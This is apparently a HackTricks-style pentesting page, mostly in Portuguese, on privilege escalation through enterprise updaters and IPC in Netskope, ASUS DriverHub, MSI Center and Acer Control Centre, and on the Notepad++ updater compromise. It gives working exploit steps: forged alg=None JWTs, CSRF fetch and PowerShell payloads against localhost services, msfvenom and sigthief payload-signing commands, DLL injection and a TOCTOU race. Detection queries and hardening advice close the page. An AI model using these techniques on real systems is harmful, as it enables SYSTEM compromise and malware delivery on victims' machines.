# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de escalada de privilégio local no Windows encontradas em agentes de endpoint empresariais e updaters que expõem uma superfície IPC de baixo atrito e um fluxo de atualização privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário com poucos privilégios pode forçar o enrollment para um servidor controlado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias-chave que você pode reutilizar contra produtos similares:
- Abusar do IPC localhost de um serviço privilegiado para forçar re-enrollment ou reconfiguração para um servidor do atacante.
- Implementar os endpoints de update do vendor, entregar um rogue Trusted Root CA, e apontar o updater para um pacote malicioso “assinado”.
- Evadir verificações fracas de signer (CN allow-lists), flags opcionais de digest, e propriedades laxas de MSI.
- Se o IPC for “encrypted”, derivar a key/IV a partir de identificadores de máquina legíveis por todos armazenados no registry.
- Se o serviço restringe callers por image path/process name, injetar em um processo allow-listed ou spawnar um suspenso e bootstrapar sua DLL via um patch mínimo de thread-context.

---
## 1) Forçando o registro (enrollment) em um servidor atacante via localhost IPC

Muitos agentes incluem um processo de UI em user-mode que se comunica com um serviço SYSTEM via localhost TCP usando JSON.

Observado no Netskope:
- UI: stAgentUI (baixa integridade) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo do exploit:
1) Crie um token JWT de enrollment cujos claims controlam o backend host (por exemplo, AddonUrl). Use alg=None para que nenhuma assinatura seja exigida.
2) Envie a mensagem IPC invocando o comando de provisionamento com seu JWT e o nome do tenant:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a contatar seu servidor malicioso para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Se a verificação do chamador for baseada em caminho/nome, origine a solicitação a partir de um binário do fornecedor que esteja na lista de permissões (veja §4).

---
## 2) Sequestrando o canal de atualização para executar código como SYSTEM

Uma vez que o cliente se comunique com seu servidor, implemente os endpoints esperados e direcione-o para um MSI atacante. Sequência típica:

1) /v2/config/org/clientconfig → Retorne uma configuração JSON com um intervalo de atualização muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado CA em PEM. O serviço o instala no repositório Trusted Root da Máquina Local.
3) /v2/checkupdate → Fornece metadata apontando para um MSI malicioso e uma versão falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: o serviço pode apenas verificar que o Subject CN é igual a “netSkope Inc” ou “Netskope, Inc.”. Sua CA maliciosa pode emitir um leaf com esse CN e assinar o MSI.
- CERT_DIGEST property: inclua uma propriedade MSI benign chamada CERT_DIGEST. Nenhuma verificação é aplicada na instalação.
- Optional digest enforcement: flag de configuração (e.g., check_msi_digest=false) desativa validação criptográfica adicional.

Result: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

A partir do R127, Netskope envolveu o JSON do IPC em um campo encryptData que parece Base64. Engenharia reversa mostrou AES com chave/IV derivados de valores do registro legíveis por qualquer usuário:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atacantes podem reproduzir a criptografia e enviar comandos cifrados válidos a partir de um usuário padrão. Dica geral: se um agent de repente “encrypts” seu IPC, procure por device IDs, product GUIDs, install IDs sob HKLM como material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Alguns serviços tentam autenticar o peer resolvendo o PID da conexão TCP e comparando o caminho/nome da imagem contra binários do vendor na allow-list localizados em Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Duas formas práticas de bypass:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) e proxy do IPC a partir dele.
- Spawn an allow-listed binary suspended e bootstrap sua proxy DLL sem CreateRemoteThread (see §5) para satisfazer regras de tamper aplicadas pelo driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Produtos frequentemente incluem um driver de minifilter/OB callbacks (e.g., Stadrv) para remover direitos perigosos de handles para processos protegidos:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Um loader em user-mode confiável que respeita essas restrições:
1) CreateProcess de um binário do vendor com CREATE_SUSPENDED.
2) Obtenha handles que você ainda tem permissão: PROCESS_VM_WRITE | PROCESS_VM_OPERATION no processo, e um handle de thread com THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ou apenas THREAD_RESUME se você patchar código em um RIP conhecido).
3) Sobrescreva ntdll!NtContinue (ou outro thunk inicial garantido mapeado) com um pequeno stub que chama LoadLibraryW no caminho da sua DLL, e então salta de volta.
4) ResumeThread para disparar seu stub in-process, carregando sua DLL.

Porque você nunca usou PROCESS_CREATE_THREAD ou PROCESS_SUSPEND_RESUME em um processo já-protegido (você o criou), a política do driver é satisfeita.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza uma rogue CA, assinatura de MSI malicioso e fornece os endpoints necessários: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope é um cliente IPC customizado que cria mensagens IPC arbitrárias (opcionalmente AES-encrypted) e inclui a injeção por processo suspenso para originar a partir de um binário da allow-list.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub inclui um serviço HTTP em user-mode (ADU.exe) em 127.0.0.1:53000 que espera chamadas do browser vindas de https://driverhub.asus.com. O filtro de Origin simplesmente executa `string_contains(".asus.com")` sobre o header Origin e sobre URLs de download expostas por `/asus/v1.0/*`. Qualquer host controlado pelo atacante como `https://driverhub.asus.com.attacker.tld` portanto passa na verificação e pode enviar requisições que alteram estado via JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para padrões adicionais de bypass.

Fluxo prático:
1) Registre um domínio que contenha `.asus.com` e hospede uma webpage maliciosa lá.
2) Use `fetch` ou XHR para chamar um endpoint privilegiado (e.g., `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o corpo JSON esperado pelo handler – o frontend JS empacotado mostra o schema abaixo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Mesmo o PowerShell CLI mostrado abaixo tem sucesso quando o cabeçalho Origin é falsificado para o valor confiável:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualquer visita do navegador ao site do atacante torna-se, portanto, um CSRF local de 1 clique (ou 0 cliques via `onload`) que aciona um helper em contexto SYSTEM.

---
## 2) Verificação insegura de assinatura de código e clonagem de certificado (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` faz o download de executáveis arbitrários definidos no corpo JSON e os coloca em cache em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceita. Após o download, o ADU.exe apenas verifica que o PE contém uma assinatura e que a string Subject corresponde a ASUS antes de executá-lo – sem `WinVerifyTrust`, sem validação da cadeia.

Para explorar o fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o assinante da ASUS nele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio que imite `.asus.com` e dispare o UpdateApp via o CSRF do navegador acima.

Como tanto os filtros Origin quanto URL são baseados em substring e a verificação do assinante apenas compara strings, o DriverHub baixa e executa o binário do atacante sob seu contexto elevado.

---
## 1) TOCTOU dentro dos caminhos de cópia/execução do updater (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP onde cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente principal (Component ID `0f 27 00 00`) fornece `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a assinatura via `CS_CommonAPI.EX_CA::Verify` (o subject do certificado deve ser “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ter sucesso).
3) Cria uma tarefa agendada que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não fica bloqueado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar Frame A apontando para um binário legítimo assinado pela MSI (garante que a verificação de assinatura passe e que a tarefa seja enfileirada).
- Competir com mensagens Frame B repetidas que apontam para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a verificação ser concluída.

Quando o agendador dispara, ele executa o payload sobrescrito sob SYSTEM apesar de ter validado o arquivo original. Exploração confiável usa duas goroutines/threads que enviam spam em CMD_AutoUpdateSDK até ganhar a janela TOCTOU.

---
## 2) Abusando de custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Cada plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes direcionem comandos a módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` sem **nenhuma validação de assinatura** – qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução como SYSTEM de forma determinística.
- Sniffar loopback com Wireshark ou instrumentar os binários .NET no dnSpy rapidamente revela o mapeamento Component ↔ command; clientes customizados em Go/ Python podem então reproduzir os frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e sua ACL discricionária permite clientes remotos (por exemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o command ID `7` com um caminho de arquivo invoca a rotina de criação de processos do serviço.
- A biblioteca cliente serializa um byte terminador mágico (113) junto com os args. Instrumentação dinâmica com Frida/`TsDotNetLib` (veja [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentação) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um integrity SID antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) cai no ramo genérico que mantém o token SYSTEM completo e define um SID de alta integridade (`S-1-16-12288`). O binário spawnado, portanto, roda como SYSTEM sem restrições, tanto localmente quanto entre máquinas.
- Combine isso com a flag de instalador exposta (`Setup.exe -nocheck`) para levantar o ACC mesmo em VMs de laboratório e exercitar o pipe sem hardware do fornecedor.

Esses bugs de IPC destacam por que serviços localhost devem impor autenticação mútua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) e por que o helper “run arbitrary binary” de cada módulo deve compartilhar as mesmas verificações de assinante.

---
## Sequestro remoto da cadeia de suprimentos via validação fraca do updater (WinGUp / Notepad++)

Atualizadores antigos do Notepad++ baseados em WinGUp não verificavam totalmente a autenticidade das atualizações. Quando atacantes comprometeram o provedor de hospedagem do servidor de atualização, eles puderam manipular o manifesto XML e redirecionar apenas clientes escolhidos para URLs de atacante. Como o cliente aceitava qualquer resposta HTTPS sem impor tanto uma cadeia de certificados confiável quanto uma assinatura PE válida, as vítimas baixavam e executavam um NSIS `update.exe` trojanizado.

Fluxo operacional (nenhuma exploração local necessária):
1. Infraestrutura interceptada: comprometer o CDN/hosting e responder às checagens de atualização com metadados do atacante apontando para uma URL de download maliciosa.
2. Trojanized NSIS: o instalador busca/executa um payload e abusa de duas cadeias de execução:
- **Bring-your-own signed binary + sideload**: empacotar o `BluetoothService.exe` assinado pela Bitdefender e deixar um `log.dll` malicioso no seu search path. Quando o binário assinado é executado, o Windows sideloads `log.dll`, que descriptografa e carrega reflectivamente o backdoor Chrysalis (protegido por Warbird + hashing de API para dificultar deteção estática).
- **Scripted shellcode injection**: o NSIS executa um script Lua compilado que usa Win32 APIs (por exemplo, `EnumWindowStationsW`) para injetar shellcode e stage um Cobalt Strike Beacon.

Lições de hardening/detecção para qualquer atualizador automático:
- Imponha **verificação de certificado + assinatura** do instalador baixado (pin o assinante do fornecedor, rejeite CN/chain incompatíveis) e assine o próprio manifesto de atualização (por exemplo, XMLDSig). Bloqueie redirecionamentos controlados pelo manifesto a menos que validados.
- Trate **BYO signed binary sideloading** como um pivot de detecção pós-download: alerte quando um EXE assinado do fornecedor carrega um nome de DLL de fora do seu caminho de instalação canônico (por exemplo, Bitdefender carregando `log.dll` de Temp/Downloads) e quando um updater solta/executa instaladores do temp com assinaturas que não são do fornecedor.
- Monitore **artefatos específicos de malware** observados nessa cadeia (úteis como pivôs genéricos): mutex `Global\Jdhfv_1.0.1`, escritas anômalas de `gup.exe` em `%TEMP%`, e estágios de injeção de shellcode dirigidos por Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando um instalador que não é do Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Esses padrões se aplicam a qualquer updater que aceite unsigned manifests ou que falhe em pin installer signers — network hijack + malicious installer + BYO-signed sideloading resultam em remote code execution sob o pretexto de atualizações “trusted”.

---
## Referências
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
